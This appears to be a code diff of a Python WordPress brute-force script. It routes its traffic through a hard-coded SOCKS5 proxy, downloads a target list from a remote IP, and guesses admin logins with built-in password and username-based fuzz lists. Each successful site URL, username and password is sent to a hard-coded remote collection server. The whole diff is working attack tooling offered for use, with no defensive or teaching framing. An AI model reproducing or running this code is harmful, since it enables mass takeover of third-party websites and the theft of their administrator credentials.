@@ -6,6 +6,7 @@ import base64
 
 # !/usr/bin/python
 # coding=utf-8
+from urlparse import urlparse
 import urllib2
 import urllib
 import time
@@ -14,19 +15,23 @@ import os,sys
 import threading
 import Queue
 import random
+import socks
+import socket
+socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "45.63.90.14", 16379)
+socket.socket = socks.socksocket
 q=Queue.Queue()
 
-passlist=['123456','000000','00000000','111111','11111111','111111111','1111111111','112233','11223344','123!@#','123$%^','123123','123123123','123321','1234','12345','1234567','12345678','123456789','1234567890','123qwe','147258369','1qaz2wsx','222222','333333','444444','54321','555555','654321','666666','66666666','7654321','777777','789456123','87654321','888888','88888888','987654321','999999','Admin','Admin1','Admin12','Admin123','Admin1234','Admin12345','Admin123456','Admin1234567','Admin12345678','Admin123456789','Angel','Pass','Pass123','Pass123456','Passwd','Password','a123456','a1234567','a123456789','a1b2c3','aaaaaaaa','abc123','abcabc','abcdef','admin','admin1','admin12','admin123','admin1234','admin12345','admin123456','admin1234567','admin12345678','admin123456789','admin888','angel','asd123','asdf1234','baseball','dragon','football','fuckyou','iloveyou','kissme','letmein','login','master','monkey','p@ssw0rd','p@ssword','pass','pass123','pass123456','passw0rd','passwd','password','princess','qazwsx','qti7Zxh18U','qwe123','qweasd','qwer1234','qwerty','qwertyui','qwertyuiop','root','root123','starwars','superman','system','test','test123','test123456','testtest','trustno1','web123','welcome','wordpress','www123']
-#passlist=['1234567','123456']
+#passlist=['123456','000000','00000000','111111','11111111','111111111','1111111111','112233','11223344','123!@#','123$%^','123123','123123123','123321','1234','12345','1234567','12345678','123456789','1234567890','123qwe','147258369','1qaz2wsx','222222','333333','444444','54321','555555','654321','666666','66666666','7654321','777777','789456123','87654321','888888','88888888','987654321','999999','Admin','Admin1','Admin12','Admin123','Admin1234','Admin12345','Admin123456','Admin1234567','Admin12345678','Admin123456789','Angel','Pass','Pass123','Pass123456','Passwd','Password','a123456','a1234567','a123456789','a1b2c3','aaaaaaaa','abc123','abcabc','abcdef','admin','admin1','admin12','admin123','admin1234','admin12345','admin123456','admin1234567','admin12345678','admin123456789','admin888','angel','asd123','asdf1234','baseball','dragon','football','fuckyou','iloveyou','kissme','letmein','login','master','monkey','p@ssw0rd','p@ssword','pass','pass123','pass123456','passw0rd','passwd','password','princess','qazwsx','qti7Zxh18U','qwe123','qweasd','qwer1234','qwerty','qwertyui','qwertyuiop','root','root123','starwars','superman','system','test','test123','test123456','testtest','trustno1','web123','welcome','wordpress','www123']
+passlist=[]
 
 
-f = urllib2.urlopen( 'https://raw.githubusercontent.com/dorgens/FREE583C0/master/all1.txt')
-with open('all1.txt', 'wb') as code:
+f = urllib2.urlopen( 'http://185.212.131.188/aparser/results/1q1q1q.txt')
+with open('all2.txt', 'wb') as code:
     code.write(f.read())
 numurl = urllib2.Request('http://45.77.60.207/wp/num.php')
 resurl_data = urllib2.urlopen(numurl)
 
-lines=open('all1.txt','r')
+lines=open('all2.txt','r')
 for line in lines:
     line=line.rstrip()
     q.put(line)
@@ -57,6 +62,7 @@ def scaner():
         while not arrayqueue.empty():
             i = arrayqueue.get()
             site= "".join(i)
+            site= urlparse(site).netloc
             site= "http://" + site.replace('http://', '').replace('https://', '') + "/"
             try:
                 #print "test url :"+site
@@ -122,8 +128,8 @@ def urlpass(url):
 
 def get_passwordlist(username):
     passwordlist = []
-    fuzz_list = ['',username,username+username,'good','!','!!!','!@#','!@#$','!@#$%','!@#$%^','!@#123','!@#456','#','##','###','#@!','*','**','***','.','..','...','0','000','000000','1','10','11','111','111111','12','123','1234','12345','123456','1234567','12345678','123456789','123abc','13','14','15','16','17','18','19','1980','1981','1982','1983','1984','1985','1986','1987','1988','1989','1990','1991','1992','1993','1994','1995','1996','1997','1998','1999','2','20','2000','2001','2002','2003','2004','2005','2006','2007','2008','2009','2010','2011','2012','2013','2014','2015','2016','2017','2018','2019','21','22','222','222222','23','24','25','26','27','28','29','3','30','31','32','321','33','333','333333','34','35','36','37','38','39','4','40','41','42','43','44','444','444444','45','46','47','48','49','5','50','51','52','53','54','55','555','555555','56','57','58','59','6','60','61','62','63','64','65','654321','66','666','666666','67','68','69','696969','7','70','71','72','73','74','75','76','77','777','777777','78','789','79','8','80','81','82','83','84','85','86','87','88','888','888888','9','99','999','999999','@','@123','@123.com','@1988','@1989','@1990','@2008','@2009','@2010','@2011','@2012','@2013','@2014','@2015','@2016','@@','@@@','@abc','@xyz','ABC','FuckFuck','Hi','I','OK','_','a','ab','abab','abc','abc123','abcabc','abcd','abcdefj','acac','ad','admin','af','asd123','b','baseball','bc','c','dragon','football','fuck','fuckyou','good','harley','hello','hi','idc','in','is','jennifer','jordan','letmein','log','login','love','master','michael','monkey','mustang','mygod','ok','password','pussy','qwe123','qwerty','shadow','superman','test','test123','testin','testinblog','testincn','testtest','thankyou','that','this','user','what','xxx','xyx','you','zxc123']
-    #fuzz_list = ['',username,username+username]
+    #fuzz_list = ['',username,username+username,'good','!','!!!','!@#','!@#$','!@#$%','!@#$%^','!@#123','!@#456','#','##','###','#@!','*','**','***','.','..','...','0','000','000000','1','10','11','111','111111','12','123','1234','12345','123456','1234567','12345678','123456789','123abc','13','14','15','16','17','18','19','1980','1981','1982','1983','1984','1985','1986','1987','1988','1989','1990','1991','1992','1993','1994','1995','1996','1997','1998','1999','2','20','2000','2001','2002','2003','2004','2005','2006','2007','2008','2009','2010','2011','2012','2013','2014','2015','2016','2017','2018','2019','21','22','222','222222','23','24','25','26','27','28','29','3','30','31','32','321','33','333','333333','34','35','36','37','38','39','4','40','41','42','43','44','444','444444','45','46','47','48','49','5','50','51','52','53','54','55','555','555555','56','57','58','59','6','60','61','62','63','64','65','654321','66','666','666666','67','68','69','696969','7','70','71','72','73','74','75','76','77','777','777777','78','789','79','8','80','81','82','83','84','85','86','87','88','888','888888','9','99','999','999999','@','@123','@123.com','@1988','@1989','@1990','@2008','@2009','@2010','@2011','@2012','@2013','@2014','@2015','@2016','@@','@@@','@abc','@xyz','ABC','FuckFuck','Hi','I','OK','_','a','ab','abab','abc','abc123','abcabc','abcd','abcdefj','acac','ad','admin','af','asd123','b','baseball','bc','c','dragon','football','fuck','fuckyou','good','harley','hello','hi','idc','in','is','jennifer','jordan','letmein','log','login','love','master','michael','monkey','mustang','mygod','ok','password','pussy','qwe123','qwerty','shadow','superman','test','test123','testin','testinblog','testincn','testtest','thankyou','that','this','user','what','xxx','xyx','you','zxc123']
+    fuzz_list = ['',username]
     for i in fuzz_list:
         passwordlist.append(username+i)
     return passwordlist
@@ -140,11 +146,11 @@ def xmlcrak(site,thisuser,ppass):
         req=post(url,data)
         #print req
         if 'isAdmin' in req:
-            dataurls = "http://45.77.60.207/cms/num.php?data=" + site + "/wp-login.php," + thisuser + "," + ppass
+            dataurls = "http://45.77.60.207/cms/good.php?url=" + site + "/wp-login.php&login=" + thisuser + "&password=" + ppass
             reqdatas = urllib2.Request(dataurls)
             res_datas = urllib2.urlopen(reqdatas)
             #print site + " [+] username = " + thisuser + " password = " + ppass
-            dataurls1="http://45.77.60.207/cms/num.php?data=" + site + "/wp-login.php," + thisuser +"," + ppass
+            dataurls1="http://45.77.60.207/cms/good.php?url=" + site + "/wp-login.php&login=" + thisuser + "&password=" + ppass
             reqdatas1 = urllib2.Request(dataurls1)
             res_datas1 = urllib2.urlopen(reqdatas1)
             return 1
@@ -218,8 +224,8 @@ def get_usernamelistxml(site):
 
 
 if __name__ == '__main__':
-    thread_num=200
-    time.sleep(random.randint(2, 10))
+    thread_num=50
+    time.sleep(random.randint(1, 2))
 
     for i in range(int(thread_num)):
         t = threading.Thread(target=scaner)
